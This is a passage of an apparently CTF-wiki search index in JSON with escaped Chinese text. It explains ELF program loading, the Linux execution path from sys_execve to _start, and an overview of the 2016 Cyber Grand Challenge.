u5b58\u4e2d\u7684\u865a\u62df\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u80af\u5b9a\u548c\u5728\u6587\u4ef6\u4e2d\u7684\u76f8\u5e94\u7684\u865a\u62df\u5730\u5740\u7684\u5dee\u76f8\u540c\u3002\u4e0b\u9762\u7ed9\u51fa\u4e86\u53ef\u80fd\u7684\u5bf9\u4e8e\u540c\u4e00\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e0d\u540c\u8fdb\u7a0b\u7684\u60c5\u51b5\uff0c\u63cf\u8ff0\u4e86\u76f8\u5bf9\u5730\u5740\u5bfb\u5740\uff0c\u6b64\u5916\u8fd9\u4e2a\u8868\u8fd8\u7ed9\u51fa\u4e86\u57fa\u5730\u5740\u7684\u8ba1\u7b97\u65b9\u6cd5\u3002","title":"\u7a0b\u5e8f\u52a0\u8f7d"},{"location":"executable/elf/program_loading/#_1","text":"\u7a0b\u5e8f\u52a0\u8f7d\u8fc7\u7a0b\u5176\u5b9e\u5c31\u662f\u7cfb\u7edf\u521b\u5efa\u6216\u8005\u6216\u8005\u6269\u5145\u8fdb\u7a0b\u955c\u7684\u8fc7\u7a0b\u3002\u5b83\u53ea\u662f\u6309\u7167\u4e00\u5b9a\u7684\u89c4\u5219\u628a\u6587\u4ef6\u7684\u6bb5\u62f7\u8d1d\u5230\u865a\u62df\u5185\u5b58\u6bb5\u4e2d\u3002\u8fdb\u7a0b\u53ea\u6709\u5728\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u4e86\u5bf9\u5e94\u7684\u903b\u8f91\u9875\u9762\u65f6\uff0c\u624d\u4f1a\u7533\u8bf7\u76f8\u5e94\u7684\u7269\u7406\u9875\u9762\u3002\u901a\u5e38\u6765\u8bf4\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u6709\u5f88\u591a\u9875\u662f\u6ca1\u6709\u88ab\u5f15\u7528\u7684\u3002\u56e0\u6b64\uff0c\u5ef6\u8fdf\u7269\u7406\u8bfb\u5199\u53ef\u4ee5\u63d0\u9ad8\u7cfb\u7edf\u7684\u6027\u80fd\u3002\u4e3a\u4e86\u8fbe\u5230\u8fd9\u6837\u7684\u6548\u7387\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u6240\u62e5\u6709\u7684\u6bb5\u7684\u6587\u4ef6\u504f\u79fb\u4ee5\u53ca\u865a\u62df\u5730\u5740\u5fc5\u987b\u662f\u5408\u9002\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u4ed6\u4eec\u5fc5\u987b\u662f\u9875\u5927\u5c0f\u7684\u6574\u6570\u500d\u3002 \u5728Intel\u67b6\u6784\u4e2d\uff0c\u865a\u62df\u5730\u5740\u4ee5\u53ca\u6587\u4ef6\u504f\u79fb\u5fc5\u987b\u662f4KB\u7684\u6574\u6570\uff0c\u6216\u8005\u8bf4\u662f\u66f4\u5927\u76842\u7684\u6574\u6570\u500d\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u5e03\u5c40\u7684\u4f8b\u5b50 \u5bf9\u5e94\u7684\u4ee3\u7801\u6bb5\u4ee5\u53ca\u6570\u636e\u6bb5\u7684\u89e3\u91ca\u5982\u4e0b \u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5c3d\u7ba1\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u5728\u6a214KB\u7684\u610f\u4e49\u4e0b\u76f8\u7b49\uff0c\u4f46\u662f\u4ecd\u7136\u6700\u591a\u67094\u4e2a\u9875\u9762\u5305\u542b\u6709\u4e0d\u7eaf\u7684\u4ee3\u7801\u6216\u8005\u6570\u636e\u3002\u5f53\u7136\uff0c\u5b9e\u9645\u4e2d\u4f1a\u53d6\u51b3\u4e8e\u9875\u5927\u5c0f\u6216\u8005\u6587\u4ef6\u7cfb\u7edf\u7684\u5757\u5927\u5c0f\u3002 \u4ee3\u7801\u6bb5\u7684\u7b2c\u4e00\u4e2a\u9875\u5305\u542b\u4e86ELF\u5934\uff0c\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u4ee5\u53ca\u5176\u4ed6\u4fe1\u606f\u3002 \u4ee3\u7801\u6bb5\u7684\u6700\u540e\u4e00\u9875\u5305\u542b\u4e86\u6570\u636e\u6bb5\u5f00\u59cb\u90e8\u5206\u7684\u526f\u672c\u3002 \u6570\u636e\u6bb5\u7684\u6700\u540e\u4e00\u9875\u5305\u542b\u4e86\u4ee3\u7801\u6bb5\u7684\u6700\u540e\u90e8\u5206\u7684\u526f\u672c\u3002\u81f3\u4e8e\u591a\u5c11\uff0c\u6682\u672a\u8bf4\u660e\u3002 \u6570\u636e\u6bb5\u7684\u6700\u540e\u4e00\u90e8\u5206\u53ef\u80fd\u4f1a\u5305\u542b\u4e0e\u7a0b\u5e8f\u8fd0\u884c\u65e0\u5173\u7684\u4fe1\u606f\u3002 \u903b\u8f91\u4e0a\u8bf4\uff0c\u7cfb\u7edf\u4f1a\u5bf9\u5f3a\u5236\u63a7\u5236\u5185\u5b58\u7684\u6743\u9650\uff0c\u5c31\u597d\u6bd4\u6bcf\u4e00\u4e2a\u6bb5\u7684\u6743\u9650\u90fd\u662f\u5b8c\u5168\u72ec\u7acb\u7684\uff1b\u6bb5\u7684\u5730\u5740\u4f1a\u88ab\u8c03\u6574\uff0c\u4ee5\u4fbf\u4e8e\u786e\u4fdd\u5185\u5b58\u4e2d\u7684\u6bcf\u4e00\u4e2a\u903b\u8f91\u9875\u90fd\u53ea\u6709\u4e00\u7ec4\u7c7b\u578b\u7684\u6743\u9650\u3002\u5728\u4e0a\u9762\u7ed9\u51fa\u7684\u4f8b\u5b50\u4e2d\uff0c\u6587\u4ef6\u7684\u4ee3\u7801\u6bb5\u7684\u6700\u540e\u4e00\u90e8\u5206\u548c\u6570\u636e\u6bb5\u7684\u5f00\u59cb\u90e8\u5206\u90fd\u4f1a\u88ab\u6620\u5c04\u4e24\u6b21\uff1a\u5206\u522b\u5728\u6570\u636e\u6bb5\u7684\u865a\u62df\u5730\u5740\u4ee5\u53ca\u4ee3\u7801\u6bb5\u7684\u865a\u62df\u5730\u5740\u3002 \u6570\u636e\u6bb5\u7684\u7ed3\u5c3e\u9700\u8981\u597d\u597d\u5904\u7406\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u7684\u6570\u636e\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u7cfb\u7edf\u8981\u6c42\u5b83\u4eec\u4ee50\u5f00\u59cb\u3002\u56e0\u6b64\uff0c\u5982\u679c\u4e00\u4e2a\u6587\u4ef6\u7684\u6700\u540e\u4e00\u9875\u5305\u542b\u4e0d\u5728\u903b\u8f91\u9875\u4e2d\u7684\u4fe1\u606f\uff0c\u90a3\u4e48\u5269\u4e0b\u7684\u6570\u636e\u5fc5\u987b\u88ab\u521d\u59cb\u5316\u4e3a0\u3002\u5269\u4e0b\u7684\u4e09\u4e2a\u9875\u4e2d\u7684\u6742\u8d28\u6570\u636e\u5728\u903b\u8f91\u4e0a\u8bf4\u5e76\u4e0d\u662f\u8fdb\u7a0b\u955c\u50cf\u7684\u4e00\u90e8\u5206\uff0c\u7cfb\u7edf\u53ef\u4ee5\u9009\u62e9\u5220\u9664\u5b83\u4eec\u3002\u8be5\u6587\u4ef6\u5bf9\u5e94\u7684\u865a\u62df\u5185\u5b58\u955c\u50cf\u5982\u4e0b\uff08\u5047\u8bbe\u6bcf\u4e00\u9875\u5927\u5c0f\u4e3a4KB\uff09 \u5728\u52a0\u8f7d\u6bb5\u65f6\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u4e0e\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u6709\u6240\u533a\u522b\u3002\u53ef\u6267\u884c\u6587\u4ef6\u901a\u5e38\u6765\u8bf4\u5305\u542b\u7edd\u5bf9\u4ee3\u7801\u3002\u4e3a\u4e86\u80fd\u591f\u4f7f\u5f97\u7a0b\u5e8f\u6b63\u786e\u6267\u884c\uff0c\u6bcf\u4e00\u4e2a\u6bb5\u5e94\u8be5\u5728\u7528\u4e8e\u6784\u5efa\u53ef\u6267\u884c\u6587\u4ef6\u7684\u865a\u62df\u5730\u5740\u5904\u3002\u56e0\u6b64\uff0c\u7cfb\u7edf\u76f4\u63a5\u4f7f\u7528p_vaddr\u4f5c\u4e3a\u865a\u62df\u5730\u5740\u3002 \u53e6\u4e00\u65b9\u9762\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u901a\u5e38\u5305\u542b\u5730\u5740\u72ec\u7acb\u4ee3\u7801\u3002\u8fd9\u4f7f\u5f97\u5728\u4e0d\u540c\u7684\u8fdb\u7a0b\u4e2d\uff0c\u540c\u4e00\u6bb5\u7684\u865a\u62df\u5730\u5740\u53ef\u80fd\u4f1a\u6709\u6240\u4e0d\u540c\uff0c\u4f46\u8fd9\u5e76\u4e0d\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u7684\u6267\u884c\u884c\u4e3a\u3002\u5c3d\u7ba1\u7cfb\u7edf\u4f1a\u4e3a\u4e0d\u540c\u7684\u8fdb\u7a0b\u9009\u62e9\u4e0d\u540c\u7684\u865a\u62df\u5730\u5740\uff0c\u4f46\u662f\u5b83\u4ecd\u65e7\u7ef4\u6301\u4e86\u6bb5\u7684\u76f8\u5bf9\u5730\u5740\u3002\u56e0\u4e3a\u5730\u5740\u72ec\u7acb\u4ee3\u7801\u5728\u4e0d\u540c\u7684\u6bb5\u4e2d\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\uff0c\u56e0\u6b64\u5728\u865a\u62df\u5185\u5b58\u4e2d\u7684\u865a\u62df\u5730\u5740\u4e4b\u95f4\u7684\u5dee\u80af\u5b9a\u548c\u5728\u6587\u4ef6\u4e2d\u7684\u76f8\u5e94\u7684\u865a\u62df\u5730\u5740\u7684\u5dee\u76f8\u540c\u3002\u4e0b\u9762\u7ed9\u51fa\u4e86\u53ef\u80fd\u7684\u5bf9\u4e8e\u540c\u4e00\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e0d\u540c\u8fdb\u7a0b\u7684\u60c5\u51b5\uff0c\u63cf\u8ff0\u4e86\u76f8\u5bf9\u5730\u5740\u5bfb\u5740\uff0c\u6b64\u5916\u8fd9\u4e2a\u8868\u8fd8\u7ed9\u51fa\u4e86\u57fa\u5730\u5740\u7684\u8ba1\u7b97\u65b9\u6cd5\u3002","title":"\u52a0\u8f7d"},{"location":"executable/elf/running_overview/","text":"\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b \u00b6 \u53c2\u8003 Execution Angleboye@Bamboofox \u3002 \u57fa\u672c\u6982\u8ff0 \u00b6 \u9759\u6001\u6267\u884c \u00b6 \u8fd9\u91cc\u7ed9\u51fa\u7a0b\u5e8f\u9759\u6001\u6267\u884c\u7684\u57fa\u672c\u8fc7\u7a0b\u3002 \u52a8\u6001\u6267\u884c \u00b6 \u57fa\u672c\u64cd\u4f5c\u8bf4\u660e \u00b6 sys_execve \u00b6 \u8be5\u51fd\u6570\u4e3b\u8981\u7528\u4e8e\u6267\u884c\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\uff0c\u5373\u6267\u884c\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u7a0b\u5e8f\uff0c\u4f1a\u68c0\u67e5\u76f8\u5e94\u7684argv\u4ee5\u53caenvp\u7b49\u53c2\u6570\u3002 do_execve \u00b6 \u8be5\u51fd\u6570\u6253\u5f00\u76ee\u6807\u6620\u50cf\u6587\u4ef6\uff0c\u5e76\u4ece\u76ee\u6807\u6587\u4ef6\u7684\u5f00\u59cb\u5904\u8bfb\u5165\u6307\u5b9a\u957f\u5ea6\u7684\uff08\u76ee\u524d\u4e3a128\uff09\u5b57\u8282\u6765\u83b7\u53d6\u76f8\u5e94\u76ee\u6807\u6587\u4ef6\u7684\u57fa\u672c\u4fe1\u606f\u3002 search_binary_handler \u00b6 \u8be5\u51fd\u6570\u4f1a\u641c\u7d22\u652f\u6301\u5904\u7406\u5f53\u524d\u7c7b\u578b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u7c7b\u578b\u961f\u5217\uff0c\u4ee5\u4fbf\u4e8e\u8ba9\u5404\u79cd\u53ef\u6267\u884c\u7a0b\u5e8f\u7684\u5904\u7406\u7a0b\u5e8f\u8fdb\u884c\u76f8\u5e94\u7684\u5904\u7406\u3002 load_elf_binary \u00b6 \u8be5\u51fd\u6570\u7684\u4e3b\u8981\u5904\u7406\u6d41\u7a0b\u5982\u4e0b \u68c0\u67e5\u5e76\u83b7\u53d6elf\u6587\u4ef6\u7684\u5934\u90e8\u4fe1\u606f\u3002 \u5982\u679c\u76ee\u6807\u6587\u4ef6\u91c7\u7528\u52a8\u6001\u94fe\u63a5\uff0c\u5219\u4f7f\u7528.interp \u8282\u6765\u786e\u5b9aloader\u7684\u8def\u5f84\u3002 \u5c06program header \u4e2d\u8bb0\u5f55\u7684\u76f8\u5e94\u7684\u6bb5\u6620\u5c04\u5230\u5185\u5b58\u4e2d\u3002program header\u4e2d\u6709\u4ee5\u4e0b\u91cd\u8981\u4fe1\u606f \u6bcf\u4e00\u4e2a\u6bb5\u9700\u8981\u6620\u5c04\u5230\u7684\u5730\u5740 \u6bcf\u4e00\u4e2a\u6bb5\u76f8\u5e94\u7684\u6743\u9650\u3002 \u8bb0\u5f55\u54ea\u4e9b\u8282\u5c5e\u4e8e\u54ea\u4e9b\u6bb5\u3002 \u5177\u4f53\u7684\u6620\u5c04\u5982\u4e0b \u5206\u60c5\u51b5\u5904\u7406 \u52a8\u6001\u94fe\u63a5\u60c5\u51b5\u4e0b\uff0c\u5c06sys_execve\u7684\u8fd4\u56de\u5730\u5740\u6539\u4e3aloader(ld.so)\u7684entry point\u3002 \u9759\u6001\u94fe\u63a5\u60c5\u51b5\u4e0b\uff0c\u5c06sys_execve\u7684\u8fd4\u56de\u5730\u5740\u6539\u4e3a\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u3002 ld.so \u00b6 \u8be5\u6587\u4ef6\u6709\u4ee5\u4e0b\u529f\u80fd \u4e3b\u8981\u7528\u4e8e\u8f7d\u5165ELF\u6587\u4ef6\u4e2dDT_NEED\u4e2d\u8bb0\u5f55\u7684\u5171\u4eab\u5e93\u3002 \u521d\u59cb\u5316\u5de5\u4f5c \u521d\u59cb\u5316GOT\u8868\u3002 \u5c06symbol table\u5408\u5e76\u5230global symbol table\u3002 _start \u00b6 _start\u51fd\u6570\u4f1a\u5c06\u4ee5\u4e0b\u9879\u76ee\u4ea4\u7ed9libc_start_main \u73af\u5883\u53d8\u91cf\u8d77\u59cb\u5730\u5740 .init \u542f\u52a8main\u51fd\u6570\u524d\u7684\u521d\u59cb\u5316\u5de5\u4f5c fini \u7a0b\u5e8f\u7ed3\u675f\u524d\u7684\u6536\u5c3e\u5de5\u4f5c\u3002","title":"\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b"},{"location":"executable/elf/running_overview/#_1","text":"\u53c2\u8003 Execution Angleboye@Bamboofox \u3002","title":"\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b"},{"location":"executable/elf/running_overview/#_2","text":"","title":"\u57fa\u672c\u6982\u8ff0"},{"location":"executable/elf/running_overview/#_3","text":"\u8fd9\u91cc\u7ed9\u51fa\u7a0b\u5e8f\u9759\u6001\u6267\u884c\u7684\u57fa\u672c\u8fc7\u7a0b\u3002","title":"\u9759\u6001\u6267\u884c"},{"location":"executable/elf/running_overview/#_4","text":"","title":"\u52a8\u6001\u6267\u884c"},{"location":"executable/elf/running_overview/#_5","text":"","title":"\u57fa\u672c\u64cd\u4f5c\u8bf4\u660e"},{"location":"executable/elf/running_overview/#sys_execve","text":"\u8be5\u51fd\u6570\u4e3b\u8981\u7528\u4e8e\u6267\u884c\u4e00\u4e2a\u65b0\u7684\u7a0b\u5e8f\uff0c\u5373\u6267\u884c\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u7a0b\u5e8f\uff0c\u4f1a\u68c0\u67e5\u76f8\u5e94\u7684argv\u4ee5\u53caenvp\u7b49\u53c2\u6570\u3002","title":"sys_execve"},{"location":"executable/elf/running_overview/#do_execve","text":"\u8be5\u51fd\u6570\u6253\u5f00\u76ee\u6807\u6620\u50cf\u6587\u4ef6\uff0c\u5e76\u4ece\u76ee\u6807\u6587\u4ef6\u7684\u5f00\u59cb\u5904\u8bfb\u5165\u6307\u5b9a\u957f\u5ea6\u7684\uff08\u76ee\u524d\u4e3a128\uff09\u5b57\u8282\u6765\u83b7\u53d6\u76f8\u5e94\u76ee\u6807\u6587\u4ef6\u7684\u57fa\u672c\u4fe1\u606f\u3002","title":"do_execve"},{"location":"executable/elf/running_overview/#search_binary_handler","text":"\u8be5\u51fd\u6570\u4f1a\u641c\u7d22\u652f\u6301\u5904\u7406\u5f53\u524d\u7c7b\u578b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u7c7b\u578b\u961f\u5217\uff0c\u4ee5\u4fbf\u4e8e\u8ba9\u5404\u79cd\u53ef\u6267\u884c\u7a0b\u5e8f\u7684\u5904\u7406\u7a0b\u5e8f\u8fdb\u884c\u76f8\u5e94\u7684\u5904\u7406\u3002","title":"search_binary_handler"},{"location":"executable/elf/running_overview/#load_elf_binary","text":"\u8be5\u51fd\u6570\u7684\u4e3b\u8981\u5904\u7406\u6d41\u7a0b\u5982\u4e0b \u68c0\u67e5\u5e76\u83b7\u53d6elf\u6587\u4ef6\u7684\u5934\u90e8\u4fe1\u606f\u3002 \u5982\u679c\u76ee\u6807\u6587\u4ef6\u91c7\u7528\u52a8\u6001\u94fe\u63a5\uff0c\u5219\u4f7f\u7528.interp \u8282\u6765\u786e\u5b9aloader\u7684\u8def\u5f84\u3002 \u5c06program header \u4e2d\u8bb0\u5f55\u7684\u76f8\u5e94\u7684\u6bb5\u6620\u5c04\u5230\u5185\u5b58\u4e2d\u3002program header\u4e2d\u6709\u4ee5\u4e0b\u91cd\u8981\u4fe1\u606f \u6bcf\u4e00\u4e2a\u6bb5\u9700\u8981\u6620\u5c04\u5230\u7684\u5730\u5740 \u6bcf\u4e00\u4e2a\u6bb5\u76f8\u5e94\u7684\u6743\u9650\u3002 \u8bb0\u5f55\u54ea\u4e9b\u8282\u5c5e\u4e8e\u54ea\u4e9b\u6bb5\u3002 \u5177\u4f53\u7684\u6620\u5c04\u5982\u4e0b \u5206\u60c5\u51b5\u5904\u7406 \u52a8\u6001\u94fe\u63a5\u60c5\u51b5\u4e0b\uff0c\u5c06sys_execve\u7684\u8fd4\u56de\u5730\u5740\u6539\u4e3aloader(ld.so)\u7684entry point\u3002 \u9759\u6001\u94fe\u63a5\u60c5\u51b5\u4e0b\uff0c\u5c06sys_execve\u7684\u8fd4\u56de\u5730\u5740\u6539\u4e3a\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u3002","title":"load_elf_binary"},{"location":"executable/elf/running_overview/#ldso","text":"\u8be5\u6587\u4ef6\u6709\u4ee5\u4e0b\u529f\u80fd \u4e3b\u8981\u7528\u4e8e\u8f7d\u5165ELF\u6587\u4ef6\u4e2dDT_NEED\u4e2d\u8bb0\u5f55\u7684\u5171\u4eab\u5e93\u3002 \u521d\u59cb\u5316\u5de5\u4f5c \u521d\u59cb\u5316GOT\u8868\u3002 \u5c06symbol table\u5408\u5e76\u5230global symbol table\u3002","title":"ld.so"},{"location":"executable/elf/running_overview/#_start","text":"_start\u51fd\u6570\u4f1a\u5c06\u4ee5\u4e0b\u9879\u76ee\u4ea4\u7ed9libc_start_main \u73af\u5883\u53d8\u91cf\u8d77\u59cb\u5730\u5740 .init \u542f\u52a8main\u51fd\u6570\u524d\u7684\u521d\u59cb\u5316\u5de5\u4f5c fini \u7a0b\u5e8f\u7ed3\u675f\u524d\u7684\u6536\u5c3e\u5de5\u4f5c\u3002","title":"_start"},{"location":"introduction/cgc/","text":"\u672c\u8282\u5185\u5bb9\u6458\u81ea\u674e\u5eb7\u6559\u6388\u4e8e 2016 \u5e74 8 \u6708 17 \u65e5 ISC \u4e92\u8054\u7f51\u5b89\u5168\u5927\u4f1a\u6f14\u8bb2\u300a\u7f51\u7edc\u8d85\u7ea7\u6311\u6218\u8d5b\u4e2d\u7684\u6f0f\u6d1e\u53d1\u6398\u4e0e\u5229\u7528\u300b\u3002 CGC \u7f51\u7edc\u8d85\u7ea7\u6311\u6218\u8d5b\u662f\u5168\u7403\u9996\u6b21\u673a\u5668\u7f51\u7edc\u653b\u9632\u6bd4\u8d5b\uff0c\u6bd4\u8d5b\u8fc7\u7a0b\u5168\u81ea\u52a8\uff0c\u65e0\u4efb\u4f55\u4eba\u5de5\u5e72\u9884\u3002\u8003\u9a8c\u673a\u5668\u81ea\u52a8\u6f0f\u6d1e\u6316\u6398\u3001\u81ea\u52a8\u8f6f\u4ef6\u52a0\u56fa\u3001\u81ea\u52a8\u6f0f\u5229\u7528\u548c\u81ea\u52a8\u7f51\u7edc\u9632\u62a4\u6c34\u5e73\u3002\u4f7f\u7528\u7b80\u5316\u7684 Linux \u64cd\u4f5c\u7cfb\u7edf------DECREE\uff0c\u7c7b\u4f3c Snort \u7684\u89c4\u5219\u8fc7\u6ee4\u9632\u706b\u5899\u3002\u5bf9 Linux \u4e8c\u8fdb\u5236\u7a0b\u5e8f\u8fdb\u884c\u6f0f\u6d1e\u6316\u6398\u3002\u6240\u6709\u53c2\u8d5b\u961f\u90fd\u6ca1\u6709\u7a0b\u5e8f\u6e90\u7801\u3002 \u5728 2016 \u5e74\u7684 CGC \u6bd4\u8d5b\u4e2d\uff0c\u6311\u6218\u7684\u8d5b\u9898\u5305\u542b\u4e86 53 \u79cd CWE\u3002\u5176\u4e2d\u5305\u542b 28 \u4e2a\u5806\u6ea2\u51fa\u6f0f\u6d1e\u300124 \u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\u300116 \u4e2a\u7a7a\u6307\u9488\u8bbf\u95ee\u6f0f\u6d1e\u300113 \u4e2a\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\u548c 8 \u4e2a UAF \u6f0f\u6d1e\u3002 \u653b\u9632\u8fc7\u7a0b\u7531\u7ec4\u7ec7\u65b9\u53d1\u51fa\u6311\u6218\u7a0b\u5e8f\uff0c\u5404\u56e2\u961f\u670d\u52a1\u5668\u53ef\u4ee5\u5411\u7ec4\u7ec7\u65b9\u63d0\u4f9b\u8865\u4e01\u7a0b\u5e8f\uff0c\u9632\u706b\u5899\u89c4\u5219\u548c\u653b\u51fb\u7a0b\u5e8f\u3002\u4fee\u8865\u8fc7\u7684\u7a0b\u5e8f\u548c\u9632\u706b\u5899\u89c4\u5219\u4f1a\u5206\u53d1\u7ed9\u5176\u4ed6\u56e2\u961f\u3002\u7ec4\u7ec7\u65b9\u4e3a\u6bcf\u4e2a\u56e2\u961f\u8fd0\u884c\u6311\u6218\u7a0b\u5e8f\uff0c\u8fdb\u884c\u670d\u52a1\u6d4b\u8bd5\u548c\u653b\u51fb\u5e76\u8fdb\u884c\u8bc4\u4f30\u3002 \u6027\u80fd\u8bc4\u4ef7\u6307\u6807 \u00b6 \u670d\u52a1\u6b63\u5e38\u8bbf\u95ee\u7684\u53cd\u5e94\u65f6\u95f4\uff1b \u6253\u8865\u4e01\u9891\u7387\uff1b \u52a0\u56fa\u7a0b\u5e8f\u7684\u6548\u7387\uff1b \u6210\u529f\u9632\u5fa1\u653b\u51fb\u7684\u6b21\u6570\u7edf\u8ba1\uff1b \u653b\u51fb\u6210\u529f\u6b21\u6570\u7edf\u8ba1\u3002 \u660e\u786e\u6838\u5fc3\u4efb\u52a1 \u00b6 \u62ff\u5230\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u8fdb\u884c\u81ea\u52a8\u5206\u6790\uff0c\u5728\u660e\u786e\u9632\u706b\u5899\u89c4\u5219\u540e\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u52a0\u56fa\u5e76\u751f\u6210\u653b\u51fb\u7a0b\u5e8f\u3002 \u5206\u6790\u65b9\u6cd5 \u00b6 \u5177\u4f53\u6267\u884c-\u4f7f\u7528\u6b63\u5e38\u7684\u6267\u884c\u6a21\u5f0f\uff1b \u7b26\u53f7\u6267\u884c-\u8f85\u52a9 Fuzzing \u9636\u6bb5\u7684\u8def\u5f84\u9009\u62e9\uff1b \u6df7\u5408\u6267\u884c-\u5e26\u6709\u5177\u4f53\u8f93\u5165\u7684\u7b26\u53f7\u6267\u884c\uff0c\u6839\u636e\u8f93\u5165\u9009\u62e9\u8def\u5f84\uff0c\u4f46\u4fdd\u7559\u7b26\u53f7\u6761\u4ef6\u3002 CGC \u7ecf\u9a8c\u603b\u7ed3 \u00b6 \u5b8c\u7f8e\u9632\u5b88\u7684\u96be\u5ea6\u8fdc\u5927\u4e8e\u751f\u6210\u653b\u51fb\u7684\u96be\u5ea6\uff1b \u4e8c\u8fdb\u5236\u52a0\u56fa\u7a0b\u5e8f\u9700\u8981\u907f\u514d\u529f\u80fd\u635f\u5931\uff0c\u5e76\u6700\u5c0f\u5316\u6027\u80fd\u635f\u5931\uff1b \u5b89\u5168\u81ea\u52a8\u5316\u5904\u7406\u7684\u5927\u8d8b\u52bf\u5df2\u7ecf\u5f62\u6210\uff0c\u591a\u6570\u56e2\u961f\u53ef\u4ee5\u5728\u51e0\u79d2\u949f\u7684\u65f6\u95f4\u5bf9\u7b80\u5355\u5e94\u7528\u5f62\u6210\u653b\u51fb\u5e76\u751f\u6210\u6709\u6548\u9632\u5b88\uff1b \u5bf9\u6297\u4e2d\u7684\u7b56\u7565\u7814\u7a76\u503c\u5f97\u671f\u5f85\uff0c\u6839\u636e\u81ea\u8eab\u548c\u5bf9\u624b\u7684\u653b\u9632\u80fd\u529b\uff0c\u5bf9\u8d44\u6e90\u548c\u52a8\u4f5c\u8fdb\u884c\u5408\u7406\u8c03\u6574\u3002","title":"CGC \u8d85\u7ea7\u6311\u6218\u8d5b"},{"location":"introduction/cgc/#_1","text":"\u670d\u52a1\u6b63\u5e38\u8bbf\u95ee\u7684\u53cd\u5e94\u65f6\u95f4\uff1b \u6253\u8865\u4e01\u9891\u7387\uff1b \u52a0\u56fa\u7a0b\u5e8f\u7684\u6548\u7387\uff1b \u6210\u529f\u9632\u5fa1\u653b\u51fb\u7684\u6b21\u6570\u7edf\u8ba1\uff1b \u653b\u51fb\u6210\u529f\u6b21\u6570\u7edf\u8ba1\u3002","title":"\u6027\u80fd\u8bc4\u4ef7\u6307\u6807"},{"location":"introduction/cgc/#_2","text":"\u62ff\u5230\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0c\u8fdb\u884c\u81ea\u52a8\u5206\u6790\uff0c\u5728\u660e\u786e\u9632\u706b\u5899\u89c4\u5219\u540e\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u52a0\u56fa\u5e76\u751f\u6210\u653b\u51fb\u7a0b\u5e8f\u3002","title":"\u660e\u786e\u6838\u5fc3\u4efb\u52a1"},{"location":"introduction/cgc/#_3","text":"\u5177\u4f53\u6267\u884c-\u4f7f\u7528\u6b63\u5e38\u7684\u6267\u884c\u6a21\u5f0f\uff1b \u7b26\u53f7\u6267\u884c-\u8f85\u52a9 Fuzzing \u9636\u6bb5\u7684\u8def\u5f84\u9009\u62e9\uff1b \u6df7\u5408\u6267\u884c-\u5e26\u6709\u5177\u4f53\u8f93\u5165\u7684\u7b26\u53f7\u6267\u884c\uff0c\u6839\u636e\u8f93\u5165\u9009\u62e9\u8def\u5f84\uff0c\u4f46\u4fdd\u7559\u7b26\u53f7\u6761\u4ef6\u3002","title":"\u5206\u6790\u65b9\u6cd5"},{"location":"introduction/cgc/#cgc","text":"\u5b8c\u7f8e\u9632\u5b88\u7684\u96be\u5ea6\u8fdc\u5927\u4e8e\u751f\u6210\u653b\u51fb\u7684\u96be\u5ea6\uff1b \u4e8c\u8fdb\u5236\u52a0\u56fa\u7a0b\u5e8f\u9700\u8981\u907f\u514d\u529f\u80fd\u635f\u5931\uff0c\u5e76\u6700\u5c0f\u5316\u6027\u80fd\u635f\u5931\uff1b \u5b89\u5168\u81ea\u52a8\u5316\u5904\u7406\u7684\u5927\u8d8b\u52bf\u5df2\u7ecf\u5f62\u6210\uff0c\u591a\u6570\u56e2\u961f\u53ef\u4ee5\u5728\u51e0\u79d2\u949f\u7684\u65f6\u95f4\u5bf9\u7b80\u5355\u5e94\u7528\u5f62\u6210\u653b\u51fb\u5e76\u751f\u6210\u6709\u6548\u9632\u5b88\uff1b \u5bf9\u6297\u4e2d\u7684\u7b56\u7565\u7814\u7a76\u503c\u5f97\u671f\u5f85\uff0c\u6839\u636e\u81ea\u8eab\u548c\u5bf9\u624b\u7684\u653b\u9632\u80fd\u529b\uff0c\u5bf9\u8d44\u6e90\u548c\u52a8\u4f5c\u8fdb\u884c\u5408\u7406\u8c03\u6574\u3002","title":"CGC \u7ecf\u9a8c\u603b\u7ed3"},{"location":"introduction/content/","text":"\u56e0\u4e3a CTF 